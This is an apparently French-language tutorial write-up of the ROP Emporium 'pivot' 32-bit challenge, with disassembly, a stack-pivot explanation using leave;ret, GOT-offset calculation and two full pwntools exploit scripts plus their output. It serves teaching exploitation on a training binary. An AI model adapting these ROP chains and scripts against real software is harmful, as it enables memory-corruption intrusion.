---
Title: Ropemporium x86_32 pivot
Date: 2023-06-17
Tags: [linux, pwn, python, ROP, x86_32, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# pivot

## Introduction

Le challenge est décrit ainsi sur le site [ropemporium](https://ropemporium.com/challenge/pivot.html)


>But why

>>To "stack pivot" just means to move the stack pointer elsewhere. It's a useful ROP technique and applies in cases where your initial chain is limited in size (as it is here) or you've been able to write a ROP chain elsewhere in memory (a heap spray perhaps) and need to "pivot" onto that new chain because you don't control the stack.

>There's more

>>In this challenge you'll also need to apply what you've previously learned about the .plt and .got.plt sections of ELF binaries. If you haven't already read Appendix A in the >Beginners' guide, this would be a good time.

>Important!
>>This challenge imports a function named foothold_function() from a library that also contains a ret2win() function.

>Offset

>>The ret2win() function in the libpivot shared object isn't imported, but that doesn't mean you can't call it using ROP! You'll need to find the .got.plt entry of >>foothold_function() and add the offset of ret2win() to it to resolve its actual address. Notice that foothold_function() isn't called during normal program flow, you'll have >>to call it first to update its .got.plt entry.

>Count the ways

>>There are a few different ways you could approach this problem; printing functions like puts() can be used to leak values from the binary, after which execution could be redirected to the start of main() for example, where you're able to send a fresh ROP chain that contains an address calculated from the leak. Another solution could be to modify a .got.plt entry in-place using a write gadget, then calling the function whose entry you modified. You could also read a .got.plt entry into a register, modify it in-memory, then redirect execution to the address in that register.

>>Once you've solved this challenge by calling ret2win(), you can try applying the same principle to the libc shared object. Use one of the many pointers to libc code in the binary to resolve libc (there are more than just the .got.plt entries), then call system() with a pointer to your command string as its 1st argument, or use a one-gagdet. You can also go back and use this technique against challenges like "callme".




Dans cet exercice on dispose de peu de place pour la chaine de ROP.

On doit donc consacrer cette espace pour préparer une seconde étape moins contrainte.

La première étape :

- Install une seconde ropchaine dans un espace inscriptible de taille suffisante.
- pivote : déplace la pile vers la seconde chaine

Seconde étape : execution de la seconde (hacking) chaine.


## Découverte

### Contenu

    -rw-r--r-- 1 root root   33 Jul 15  2020 flag.txt
    -rwxr-xr-x 1 root root 7404 Jul 16  2020 libpivot32.so
    -rwxr-xr-x 1 root root 7584 Jul 16  2020 pivot32

### Execution du programme pivot32

    07_pivot# ./pivot32
    pivot by ROP Emporium
    x86

    Call ret2win() from libpivot
    The Old Gods kindly bestow upon you a place to pivot: 0xf7cbbf10
    Send a ROP chain now and it will land there
    > AAAAAAAA
    Thank you!

    Now please send your stack smash
    > BBBBBBBBBBBBB
    Thank you!

    Exiting

Ce programme effectue deux lectures.

## Analyse

### Code du programme pivot32

La fonction principale

```
 202: int main (char **argv);
│           ; var int32_t var_10h @ ebp-0x10
│           ; var void *ptr @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg char **argv @ esp+0x44
│           0x08048686      8d4c2404       lea ecx, [argv]
│           0x0804868a      83e4f0         and esp, 0xfffffff0
│           0x0804868d      ff71fc         push dword [ecx - 4]
│           0x08048690      55             push ebp
│           0x08048691      89e5           mov ebp, esp
│           0x08048693      51             push ecx
│           0x08048694      83ec14         sub esp, 0x14
│           0x08048697      a13ca00408     mov eax, dword [loc._edata] ; obj.__TMC_END__
│           0x0804869c      6a00           push 0
│           0x0804869e      6a02           push 2                      ; 2
│           0x080486a0      6a00           push 0                      ; char *buf
│           0x080486a2      50             push eax                    ; FILE*stream
│           0x080486a3      e898feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x080486a8      83c410         add esp, 0x10
│           0x080486ab      83ec0c         sub esp, 0xc
│           0x080486ae      68c0880408     push str.pivot_by_ROP_Emporium ; 0x80488c0 ; "pivot by ROP Emporium" ; const char *s
│           0x080486b3      e848feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080486b8      83c410         add esp, 0x10
│           0x080486bb      83ec0c         sub esp, 0xc
│           0x080486be      68d6880408     push str.x86_n              ; 0x80488d6 ; "x86\n" ; const char *s
│           0x080486c3      e838feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080486c8      83c410         add esp, 0x10
│           0x080486cb      c745f4000000.  mov dword [ptr], 0
│           0x080486d2      83ec0c         sub esp, 0xc
│           0x080486d5      6800000001     push 0x1000000              ; size_t size
│           0x080486da      e811feffff     call sym.imp.malloc         ;  void *malloc(size_t size)
│           0x080486df      83c410         add esp, 0x10
│           0x080486e2      8945f4         mov dword [ptr], eax
│           0x080486e5      837df400       cmp dword [ptr], 0
│       ┌─< 0x080486e9      751a           jne 0x8048705
│       │   0x080486eb      83ec0c         sub esp, 0xc
│       │   0x080486ee      68dc880408     push str.Failed_to_request_space_for_pivot_stack ; 0x80488dc ;
│       │   0x080486f3      e808feffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x080486f8      83c410         add esp, 0x10
│       │   0x080486fb      83ec0c         sub esp, 0xc
│       │   0x080486fe      6a01           push 1                      ; 1
│       │   0x08048700      e80bfeffff     call sym.imp.exit
│       │   ; CODE XREF from main @ 0x80486e9
│       └─> 0x08048705      8b45f4         mov eax, dword [ptr]
│           0x08048708      0500ffff00     add eax, 0xffff00
│           0x0804870d      8945f0         mov dword [var_10h], eax
│           0x08048710      83ec0c         sub esp, 0xc
│           0x08048713      ff75f0         push dword [var_10h]        ; [ptr]+0xffff00
│           0x08048716      e835000000     call sym.pwnme
│           0x0804871b      83c410         add esp, 0x10
│           0x0804871e      c745f0000000.  mov dword [var_10h], 0
│           0x08048725      83ec0c         sub esp, 0xc
│           0x08048728      ff75f4         push dword [ptr]            ; void *ptr
│           0x0804872b      e8b0fdffff     call sym.imp.free           ; void free(void *ptr)
│           0x08048730      83c410         add esp, 0x10
│           0x08048733      83ec0c         sub esp, 0xc
│           0x08048736      6804890408     push str._nExiting          ; 0x8048904 ; "\nExiting" ; const char *s
│           0x0804873b      e8c0fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048740      83c410         add esp, 0x10
│           0x08048743      b800000000     mov eax, 0
│           0x08048748      8b4dfc         mov ecx, dword [var_4h]
│           0x0804874b      c9             leave
│           0x0804874c      8d61fc         lea esp, [ecx - 4]
└           0x0804874f      c3             ret
```
La fonction principale alloue un bloc mémoire important (16 Mo)
Elle appelle ensuite la fonction pwnme avec en paramètre `ptr+0xffff00` autrement dit 256 octets avant la fin de la zonne allouée.

Cette adresse constitue une bonne implantation pour une chaine de ROP


La fonction pwnme

```
┌ 199: sym.pwnme (int32_t arg_8h);
│           ; var void *s @ ebp-0x28
│           ; arg int32_t arg_8h @ ebp+0x8
│           0x08048750      55             push ebp
│           0x08048751      89e5           mov ebp, esp
│           0x08048753      83ec28         sub esp, 0x28
│           0x08048756      83ec04         sub esp, 4
│           0x08048759      6a20           push 0x20                   ; 32
│           0x0804875b      6a00           push 0                      ; int c
│           0x0804875d      8d45d8         lea eax, [s]
│           0x08048760      50             push eax                    ; void *s
│           0x08048761      e8eafdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x08048766      83c410         add esp, 0x10
│           0x08048769      83ec0c         sub esp, 0xc
│           0x0804876c      680d890408     push str.Call_ret2win___from_libpivot ; 0x804890d ; "Call ret2win() from libpivot" ; const char *s
│           0x08048771      e88afdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048776      83c410         add esp, 0x10
│           0x08048779      83ec08         sub esp, 8
│           0x0804877c      ff7508         push dword [arg_8h]
│           0x0804877f      682c890408     push str.The_Old_Gods_kindly_bestow_upon_you_a_place_to_pivot:__p_n ; 0x804892c ;
│           0x08048784      e847fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08048789      83c410         add esp, 0x10
│           0x0804878c      83ec0c         sub esp, 0xc
│           0x0804878f      6868890408     push str.Send_a_ROP_chain_now_and_it_will_land_there ; 0x8048968 ;
│           0x08048794      e867fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048799      83c410         add esp, 0x10
│           0x0804879c      83ec0c         sub esp, 0xc
│           0x0804879f      6894890408     push 0x8048994              ; const char *format
│           0x080487a4      e827fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080487a9      83c410         add esp, 0x10
│           0x080487ac      83ec04         sub esp, 4
│           0x080487af      6800010000     push 0x100                  ; 256
│           0x080487b4      ff7508         push dword [arg_8h]
│           0x080487b7      6a00           push 0                      ; int fildes
│           0x080487b9      e802fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x080487be      83c410         add esp, 0x10
│           0x080487c1      83ec0c         sub esp, 0xc
│           0x080487c4      6897890408     push str.Thank_you__n       ; 0x8048997 ; "Thank you!\n" ; const char *s
│           0x080487c9      e832fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080487ce      83c410         add esp, 0x10
│           0x080487d1      83ec0c         sub esp, 0xc
│           0x080487d4      68a4890408     push str.Now_please_send_your_stack_smash ; 0x80489a4 ;
│           0x080487d9      e822fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080487de      83c410         add esp, 0x10
│           0x080487e1      83ec0c         sub esp, 0xc
│           0x080487e4      6894890408     push 0x8048994              ; const char *format
│           0x080487e9      e8e2fcffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080487ee      83c410         add esp, 0x10
│           0x080487f1      83ec04         sub esp, 4
│           0x080487f4      6a38           push 0x38                   ; '8' ; 56
│           0x080487f6      8d45d8         lea eax, [s]
│           0x080487f9      50             push eax
│           0x080487fa      6a00           push 0                      ; int fildes
│           0x080487fc      e8bffcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x08048801      83c410         add esp, 0x10
│           0x08048804      83ec0c         sub esp, 0xc
│           0x08048807      68c5890408     push str.Thank_you_         ; 0x80489c5 ; "Thank you!" ; const char *s
│           0x0804880c      e8effcffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048811      83c410         add esp, 0x10
│           0x08048814      90             nop
│           0x08048815      c9             leave
└           0x08048816      c3             ret
```
La fonction pwnme nous affiche l'adresse reçue en argument.

        0x0804877c      ff7508         push dword [arg_8h]
        0x0804877f      682c890408     push str.The_Old_Gods_kindly_bestow_upon_you_a_place_to_pivot:__p_n ; 0x804892c ;


Ensuite, elle effectue deux lectures sur stdin.

- La première lit 256 octet dans la zône mémoire allouée.

        0x080487af      6800010000     push 0x100                  ; 256
        0x080487b4      ff7508         push dword [arg_8h]         ; parametre de la fonction
        0x080487b7      6a00           push 0                      ; stdin
        0x080487b9      e802fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)



- La seconde est vunérable à un débordement.

        0x080487f4      6a38           push 0x38                   ; '8' ; 56
        0x080487f6      8d45d8         lea eax, [ebp-0x28]
        0x080487f9      50             push eax
        0x080487fa      6a00           push 0                      ; int fildes
        0x080487fc      e8bffcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)

L'offset de débordement sur eip est toujours de 0x2c (44) octets.
Mais le lecture est de 56 octets on a donc seulement 12 octets de débordement soit 3 mots de 32 bits.
Ca ne fait pas beaucoup.

uselessFunction

    ┌ 23: sym.uselessFunction ();
    │           0x08048817      55             push ebp
    │           0x08048818      89e5           mov ebp, esp
    │           0x0804881a      83ec08         sub esp, 8
    │           0x0804881d      e8fefcffff     call sym.imp.foothold_function
    │           0x08048822      83ec0c         sub esp, 0xc
    │           0x08048825      6a01           push 1                      ; 1
    │           0x08048827      e8e4fcffff     call sym.imp.exit
    │           ;-- usefulGadgets:
    │           0x0804882c      58             pop eax
    └           0x0804882d      c3             ret

La fonction uselessFunction n'est pas utilisée mais appelle un fonction située dans la librairie : `foothold_function`

### Dans la librairie libpivot32.so

La librairie contient une fonction foothold_function


    ┌ 43: sym.foothold_function ();
    │           ; var int32_t var_4h @ ebp-0x4
    │           0x0000077d      55             push ebp
    │           0x0000077e      89e5           mov ebp, esp
    │           0x00000780      53             push ebx
    │           0x00000781      83ec04         sub esp, 4
    │           0x00000784      e88f020000     call sym.__x86.get_pc_thunk.ax
    │           0x00000789      0577180000     add eax, 0x1877
    │           0x0000078e      83ec0c         sub esp, 0xc
    │           0x00000791      8d9030eaffff   lea edx, [eax - 0x15d0]
    │           0x00000797      52             push edx                    ; const char *s
    │           0x00000798      89c3           mov ebx, eax
    │           0x0000079a      e8a1feffff     call sym.imp.puts           ; int puts(const char *s)
    │           0x0000079f      83c410         add esp, 0x10
    │           0x000007a2      90             nop
    │           0x000007a3      8b5dfc         mov ebx, dword [var_4h]
    │           0x000007a6      c9             leave
    └           0x000007a7      c3             ret

La fonction cible ret2win nous affiche le flag.

    ┌ 164: sym.ret2win ();
    │           ; var file*stream @ ebp-0x34
    │           ; var char *s @ ebp-0x2d
    │           ; var int32_t var_ch @ ebp-0xc
    │           0x00000974      55             push ebp
    │           0x00000975      89e5           mov ebp, esp
    │           0x00000977      53             push ebx
    │           0x00000978      83ec34         sub esp, 0x34
    │           0x0000097b      e800fdffff     call entry0
    │           0x00000980      81c380160000   add ebx, 0x1680
    │           0x00000986      65a114000000   mov eax, dword gs:[0x14]
    │           0x0000098c      8945f4         mov dword [var_ch], eax
    │           0x0000098f      31c0           xor eax, eax
    │           0x00000991      c745cc000000.  mov dword [stream], 0
    │           0x00000998      83ec08         sub esp, 8
    │           0x0000099b      8d8396eaffff   lea eax, [ebx - 0x156a]
    │           0x000009a1      50             push eax                    ; const char *mode
    │           0x000009a2      8d8398eaffff   lea eax, [ebx - 0x1568]
    │           0x000009a8      50             push eax                    ; const char *filename
    │           0x000009a9      e8b2fcffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
    │           0x000009ae      83c410         add esp, 0x10
    │           0x000009b1      8945cc         mov dword [stream], eax
    │           0x000009b4      837dcc00       cmp dword [stream], 0
    │       ┌─< 0x000009b8      751c           jne 0x9d6
    │       │   0x000009ba      83ec0c         sub esp, 0xc
    │       │   0x000009bd      8d83a1eaffff   lea eax, [ebx - 0x155f]
    │       │   0x000009c3      50             push eax                    ; const char *s
    │       │   0x000009c4      e877fcffff     call sym.imp.puts           ; int puts(const char *s)
    │       │   0x000009c9      83c410         add esp, 0x10
    │       │   0x000009cc      83ec0c         sub esp, 0xc
    │       │   0x000009cf      6a01           push 1
    │       │   0x000009d1      e87afcffff     call sym.imp.exit
    │       │   ; CODE XREF from sym.ret2win @ 0x9b8
    │       └─> 0x000009d6      83ec04         sub esp, 4
    │           0x000009d9      ff75cc         push dword [stream]         ; FILE *stream
    │           0x000009dc      6a21           push 0x21                   ; '!' ; int size
    │           0x000009de      8d45d3         lea eax, [s]
    │           0x000009e1      50             push eax                    ; char *s
    │           0x000009e2      e839fcffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
    │           0x000009e7      83c410         add esp, 0x10
    │           0x000009ea      83ec0c         sub esp, 0xc
    │           0x000009ed      8d45d3         lea eax, [s]
    │           0x000009f0      50             push eax                    ; const char *s
    │           0x000009f1      e84afcffff     call sym.imp.puts           ; int puts(const char *s)
    │           0x000009f6      83c410         add esp, 0x10
    │           0x000009f9      83ec0c         sub esp, 0xc
    │           0x000009fc      ff75cc         push dword [stream]         ; FILE *stream
    │           0x000009ff      e82cfcffff     call sym.imp.fclose         ; int fclose(FILE *stream)
    │           0x00000a04      83c410         add esp, 0x10
    │           0x00000a07      c745cc000000.  mov dword [stream], 0
    │           0x00000a0e      83ec0c         sub esp, 0xc
    │           0x00000a11      6a00           push 0
    └           0x00000a13      e838fcffff     call sym.imp.exit

En résumé,

1. La première lecture nous permet d'enoyer une chaine de rop sans contrainte.
L'adresse de début nous est donné.

2. La seconde lecture nous permet juste d'envisager de basculer la pile sur la zone alloué.

## Construction de la chaine de ROP

### Première chaine de rop: le pivot

Pour effectue un pivot il nous faut simplement charger l'adresse cible dans esp.

Pour cela on recherche un gadget de type "pop esp" ou "mov esp"

On trouve bien un

    0x0804874c : lea esp, [ecx - 4] ; ret

Mais rien pour maitriser ecx.

On envisage donc d'utilise `leave`. par exemple :

        0x080485f5 : leave ; ret

L'instruction leave est l'équivalent de `mov esp, ebp; pop ebp`.

Comme lors du déboredment on a dû ecraser la sauvegarde de `ebp`, à la sortie de `pwnme` on effectue
un premier "leave; ret" donc "mov esp,ebp; pop ebp; ret" qui va placer le dernier mot de débordement dans `ebp`.

Et donc un "leave;ret" va mettre cette valeur dans esp.

On reprend.

    Message : AAAAAAAAA...AAAAAAAAA[STACKTARGET][ROP1target]
                                                    |
                                                    `--> leave;ret
    leave de pwnme :
        esp <= ebp
        ebp <= STACKTARGET
    ret de pwnme :
        rip <= ROP1target
    leave de ROP1target
        esp <= STACKTARGET
        ebp <= Premier mot de la ropchaine


Au final la rop chaine de pivot.

| ROP entry | comment |
| ----------- | ------- |
| leak | adresse d'implantation de la chaine d'exploitation - 4 |
| 0x080485f5 | leave;ret |

A noter le -4 nécessaire pour ajusement du fait que les adresses de paramètres de la fonction sont calculés par rapport de ebp positionnée par le mov esp,ebp dans un contexte d'appel call
A noter que le prefixe de débordement doit faire 40 caractères et non plus 44 puisqu'on vise à modifier `SEBP`.


### Seconde chaine de rop: l'exploitation

La seconde chaine de rop en terme d'execution sera la première envoyée on est bien d'accord.


Pour executer `ret2win` qui se trouve dans la librairie il nous faut son adresse.
On ne peut pas l'avoir directement.

Le leak founit correspondant à une adresse sur le tas ne nous est d'aucune utilité pour cela.

En revanche le programme n'etant pas en PIE on dispose de la GOT.

Observons cette table sous gdb/GEF.

    got
    [0x804a00c] read@GLIBC_2.0  →  0x80484c6
    [0x804a010] printf@GLIBC_2.0  →  0x80484d6
    [0x804a014] free@GLIBC_2.0  →  0x80484e6
    [0x804a018] malloc@GLIBC_2.0  →  0x80484f6
    [0x804a01c] puts@GLIBC_2.0  →  0x8048506
    [0x804a020] exit@GLIBC_2.0  →  0x8048516
    [0x804a024] foothold_function  →  0x8048526
    [0x804a028] __libc_start_main@GLIBC_2.0  →  0xf7de1d40
    [0x804a02c] setvbuf@GLIBC_2.0  →  0x8048546
    [0x804a030] memset@GLIBC_2.0  →  0x8048556


    [0x804a024] foothold_function  →  0x8048526

La fonction `foothold_function` est située dans la libraire. Après une première execution son adresse réelle remplacera`0x8048526`.
La fonction ret2win se trouve à une disatance constante de `foothold_function` dans libpivot32.so.

Par exemple sous gdb :

        gef➤  p foothold_function
        $1 = {<text variable, no debug info>} 0xf7fc777d <foothold_function>
        gef➤  p ret2win
        $2 = {<text variable, no debug info>} 0xf7fc7974 <ret2win>
        gef➤  p 0xf7fc7974 - 0xf7fc777d
        $3 = 0x1f7

Ajouter 0x1f7 à l'adresse de `foothold_function` nous donne celle de `ret2win`
Le calcule de cette difference est automatisable en python avec pwntools.




Dés lors on aurra trois methodes possibles.

1. Lire l'entrée `foothold_function` de la GOT et rappeler l'adresse calculée de `ret2win`

2. Lire l'entrée de la GOT dans une registre, l'ajuster et executer un gadget "call reg"

3. Modifier l'entrée de la GOT de foothold_function et appeller l'entrée PLT associée.

### Methode 1 lecture de la GOT.

Les étapes :
- Appel de foothold pour garnir la got
- Appeller puts avec l'adresse de `foothold_function` dans la GOT
- Recuperation de l'adresse `foothold_function` et calcule de l'adresse `ret2win`
- Retour au début de pwnme
- Renvoyer un premier message indiférent
- Renvoi d'une nouvelle chaine de ROP avec
    - l'adresse de ret2win calculée

Phase 1 : Premier message :

Pour l'appel de puts il nous faut un gadget pop;ret de retour de fonction pour sauter le paramètre dans la chaine.
Nous avons en effet vus avec l'exercice callme qu'en 32 bits, il faut positionner avant les paramètres l'equivalent d'une adresse de retour qui consomme ces paramètes afin de poursuivre la chaine. Classiquement un gadget "pop;pop...; ret"

    0x80484a9 pop ebx; ret

|address   | comment |
|----------|--------------|
|0x0048520 | foothold_function@plt
|0x8048500 | puts@plt
|0x80484a9 | pop ebp; ret
|0x804a024 | foothold_function@got
|0x8048750 | pwnme


Phase 1: Second message avec débordement.

Le second Message déborde avec la chaine pivot.
Le debordement doit se faire jusquà la sauvegerde SEBP cat on va l'excraser avec l'adresse de pivot.
Arbitrairement on considère que cette adresse est au début de la chaine et pas a la fin du débordement.


| ROP entry | comment |
| ----------- | ------- |
| leak | adresse d'implantation de la chaine d'exploitation - 4 |
| 0x080485f5 | leave;ret |

Noter le -4 sur l'adresse de pivot comme vu plus haut.

La chaine d'exploitation s'execute donc on recupère l'adresse foothold_function@got
Calcule de l'adresse de ret3win@got.

**Premier message replay.**

On envoie "ok"

**Second message**

On effectue un débordement en ecrasant SEBP.

| ROP entry | comment |
| ----------- | ------- |
| ret2win | adresse calculée de re2win|


### Methode 2 call reg

L'idée est d'appeller la fonction re2win avec une "call reg".
Le rechistre doit être chargé avec l'adresse de ret2win.




Ce qui donne le synoptique suivant :

- Appel de foothold pour garnir la got
- Lecture de l'entrée de la GOT
- ajustement du registre reg
- call reg

Recherche  des gadgets nécessaires

On trouve 2 gadgets de ce style.

    0x080485f0 : call eax
    0x0804863d : call edx

Ensuite pour charger le contenu de l'entrée GOT dans un ce ces registres :

    0x08048830 : mov eax, dword ptr [eax] ; ret

Enfin, pour charger eax avec l'adresse de l'entree GOT.

    0x0804882c : pop eax ; ret

Pour incrémenter eax :

    0x08048833 : add eax, ebx ; ret
    0x080484a9 : pop ebx ; ret



Premier message


| address   | comment |
|----------|--------------|
| 0x0048520 | foothold_function@plt
| 0x804882c | pop eax ; ret
| 0x804a024 | foothold_function@got
| 0x8048830 | mov eax, dword ptr [eax] ; ret
| 0x80484a9 | pop ebx ; ret
| 0x1f7 | Pour ebx
| 0x8048833 | add eax, ebx ; ret
| 0x80485f0 | call eax

On récupère l'adresse de la zone allouée dans le tas.

Second message avec débordement.

Le second Message déborde avec la chaine pivot.

| ROP entry | comment |
| ----------- | ------- |
| leak | adresse d'implantation de la chaine d'exploitation  -4|
| 0x080485f5 | leave;ret |

Le pivot enchaine sur la chaine de ROP postée avant.

## Exploitation

### Methode 1.

Methode en deux etape.
- On affiche l'adresse de la fonction foothold_function et on reboucle.
- On appelle l'adresse calculée de `re2win`.


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version avec lecture de la GOT avec puts et rappel

# ret : *pwnme+198
# read : *pwnme+172
gs='''
b *pwnme+172
c
'''
# Set up pwntools for the correct architecture
elf =  ELF('pivot32')
context.binary=elf
context.log_level='debug'

libelf = ELF('libpivot32.so')

useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
plt_puts=elf.plt['puts']
pwnme=elf.symbols['pwnme']

lib_foothold = libelf.symbols['foothold_function']
lib_re2win = libelf.symbols['ret2win']
# Distance entre les fonctions ret2win et foothold_function
off_ret2win=lib_re2win-lib_foothold


# Les gadgets

# pop eax; ret
g_pop_eax=0x804882c

# mov eax, dword ptr [eax] ; ret
g_mov_eax_eax = 0x8048830

# pop ebx ; ret
g_pop_ebx=0x80484a9

# add eax, ebx ; ret
g_add_eax_ebx=0x8048833

# call eax
g_call_eax = 0x80485f0

# leave; ret
g_leave = 0x080485f5


io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")
log.info(f"{plt_foothold=:x}")
log.info(f"{got_foothold=:x}")
log.info(f"offset ret2win = 0x{off_ret2win}")

# ETAPE 1 - Message 1
# ROP chaine d'exploitation
PL=b''
PL+=p32(plt_foothold)         # Pour charger la G0T
PL+=p32(plt_puts)             # puts@plt
PL+=p32(g_pop_ebx)            # gadget de conso du parametre
PL+=p32(got_foothold)         # parametere de puts
PL+=p32(pwnme)                # Retour dans pwnme

io.sendlineafter(b"> ",PL)

# ETAPE 1 - Message 2 : pivot
# Offset avant ecrasement de l'adresse de EBP
offset=0x28

PL =b"A"*offset
PL+=p32(leak-4)     # pour SEBP
PL+=p32(g_leave)    # pour SEIP
io.sendlineafter(b"> ",PL)

# ETAPE INTERMEDIAIRE
# Le puts est effectué on lit l'adresse de foothold.
# Reception du leak puts
io.recvline()
io.recvline()
rep = io.recvline().rstrip()
print(rep)
info(rep.hex())
#leak=u32(rep[:4]+b"\x00\x00")
leak=u32(rep[:4])

# Calcule de l'adresse de ret2win
ret2win = leak+off_ret2win
info(f"foothold leak={leak:x}")
info(f"ret2win      ={ret2win:x}")

# ETAPE 2 - Message 1

# Recoit un LF precedent (?!)
#io.sendline(b"OK")

# ETAPE 2 - Message 2
# Envoi d'un bourrage de debordement ecransant aussi SEBP
PL =b"A"*(offset+4)
PL+=p32(ret2win)
io.sendlineafter(b"> ",PL)

io.interactive()
```

Execution :

    07_pivot$ python3 solve1.py
    [*] '/home/jce/w/ropemporium/x32/07_pivot/pivot32'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
        RUNPATH:  b'.'
    [*] '/home/jce/w/ropemporium/x32/07_pivot/libpivot32.so'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Starting local process '/home/jce/w/ropemporium/x32/07_pivot/pivot32': pid 6343
    [*] leak=f7d3ff10
    [*] plt_foothold=8048520
    [*] got_foothold=804a024
    [*] offset ret2win = 0x503
    b'}\x17\xf4\xf7@\xbd\xd5\xf7\x90\xcc\xda\xf7@w\xe8\xf7'
    [*] 7d17f4f740bdd5f790ccdaf74077e8f7
    [*] foothold leak=f7f4177d
    [*] ret2win      =f7f41974
    [*] Switching to interactive mode
    [*] Process '/home/jce/w/ropemporium/x32/07_pivot/pivot32' stopped with exit code 0 (pid 6343)
    Thank you!

    Now please send your stack smash
    > Thank you!
    ROPE{a_placeholder_32byte_flag!}


### Methode 2.

Méthode en un passage.
- on lit dans eax l'adresse de `foothold_function`
- on lui ajoute l'offset avec la fonction ret2win
- gadget `call eax`

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version avec appel de call eax et xchg vs leave

# ret : *pwnme+198
# read : *pwnme+172
gs='''
b *pwnme+198
c
'''
# Set up pwntools for the correct architecture
elf =  ELF('pivot32')
context.binary=elf

libelf = ELF('libpivot32.so')

useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']

lib_foothold = libelf.symbols['foothold_function']
lib_re2win = libelf.symbols['ret2win']
off_ret2win=lib_re2win-lib_foothold


# Les gadgets

# pop eax; ret
g_pop_eax=0x804882c

# mov eax, dword ptr [eax] ; ret
g_mov_eax_eax = 0x8048830

# pop ebx ; ret
g_pop_ebx=0x80484a9

# add eax, ebx ; ret
g_add_eax_ebx=0x8048833

# call eax
g_call_eax = 0x80485f0

# leave; ret
g_leave = 0x080485f5

# 0x0804882e : xchg eax, esp ; ret
g_xchg_eax_esp = 0x0804882e


io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")
log.info(f"{plt_foothold=:x}")
log.info(f"{got_foothold=:x}")
log.info(f"offset ret2win = 0x{off_ret2win}")

# Message 1
# ROP chaine d'exploitation
PL=b''
PL+=p32(plt_foothold)           # charche le GIT
PL+=p32(g_pop_eax)              #
PL+=p32(got_foothold)           #
PL+=p32(g_mov_eax_eax)          # eax <= [got_foothold]
PL+=p32(g_pop_ebx)
PL+=p32(off_ret2win)            # ebx <= offset_ret2win
PL+=p32(g_add_eax_ebx)          # eax <=ret2win
PL+=p32(g_call_eax)

io.sendlineafter(b"> ",PL)

# Message 2 : pivot
# Offset de debordement incluant SEBP
offset=0x2c

PL =b"A"*offset
PL+=p32(g_pop_eax)
PL+=p32(leak)
PL+=p32(g_xchg_eax_esp)
PL+=p32(g_leave)    # pour SEIP
io.sendlineafter(b"> ",PL)

io.interactive()

```
